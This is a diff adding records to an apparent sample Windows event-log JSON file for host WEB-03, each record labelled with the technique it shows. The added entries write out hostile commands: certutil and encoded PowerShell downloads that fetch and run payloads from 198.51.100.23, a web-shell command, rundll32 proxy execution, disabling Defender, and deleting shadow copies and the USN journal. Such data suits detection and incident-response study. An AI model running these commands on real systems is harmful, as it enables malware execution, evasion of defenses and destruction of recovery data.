@@ -1,5 +1,53 @@
 [
   {
+    "ts": "2026-05-02T09:10:30Z",
+    "event_id": 4688,
+    "channel": "Security",
+    "computer": "WEB-03",
+    "user": "",
+    "process": "certutil.exe",
+    "parent_process": "",
+    "cmdline": "certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\\Users\\Public\\p.exe",
+    "dst_ip": "",
+    "detail": "certutil URLCache download"
+  },
+  {
+    "ts": "2026-05-02T09:11:00Z",
+    "event_id": 4688,
+    "channel": "Security",
+    "computer": "WEB-03",
+    "user": "",
+    "process": "powershell.exe",
+    "parent_process": "",
+    "cmdline": "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHMAdABhAGcAZQAuAHAAcwAxACcAKQA=",
+    "dst_ip": "",
+    "detail": "encoded PowerShell download cradle"
+  },
+  {
+    "ts": "2026-05-02T09:11:05Z",
+    "event_id": 4104,
+    "channel": "Microsoft-Windows-PowerShell/Operational",
+    "computer": "WEB-03",
+    "user": "",
+    "process": "",
+    "parent_process": "",
+    "cmdline": "",
+    "dst_ip": "",
+    "detail": "ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage.ps1')"
+  },
+  {
+    "ts": "2026-05-02T09:11:30Z",
+    "event_id": 4688,
+    "channel": "Security",
+    "computer": "WEB-03",
+    "user": "",
+    "process": "cmd.exe",
+    "parent_process": "w3wp.exe",
+    "cmdline": "cmd.exe /c whoami & net user",
+    "dst_ip": "",
+    "detail": "IIS worker spawned a shell (web shell)"
+  },
+  {
     "ts": "2026-05-02T09:12:00Z",
     "event_id": 4688,
     "channel": "Security",
@@ -43,7 +91,7 @@
     "user": "",
     "process": "rundll32.exe",
     "parent_process": "",
-    "cmdline": "",
+    "cmdline": "rundll32.exe C:\\Users\\Public\\d.dll,Run",
     "dst_ip": "",
     "detail": "proxied execution"
   },
@@ -82,6 +130,42 @@
     "cmdline": "",
     "dst_ip": "",
     "detail": "external device recognized: USBSTOR"
+  },
+  {
+    "ts": "2026-05-02T09:38:00Z",
+    "event_id": 4688,
+    "channel": "Security",
+    "computer": "WEB-03",
+    "user": "",
+    "process": "powershell.exe",
+    "parent_process": "",
+    "cmdline": "powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true",
+    "dst_ip": "",
+    "detail": "Defender real-time monitoring disabled"
+  },
+  {
+    "ts": "2026-05-02T09:38:30Z",
+    "event_id": 4688,
+    "channel": "Security",
+    "computer": "WEB-03",
+    "user": "",
+    "process": "vssadmin.exe",
+    "parent_process": "",
+    "cmdline": "vssadmin.exe delete shadows /all /quiet",
+    "dst_ip": "",
+    "detail": "shadow copies deleted"
+  },
+  {
+    "ts": "2026-05-02T09:39:00Z",
+    "event_id": 4688,
+    "channel": "Security",
+    "computer": "WEB-03",
+    "user": "",
+    "process": "fsutil.exe",
+    "parent_process": "",
+    "cmdline": "fsutil usn deletejournal /D C:",
+    "dst_ip": "",
+    "detail": "USN change journal deleted"
   },
   {
     "ts": "2026-05-02T09:40:00Z",
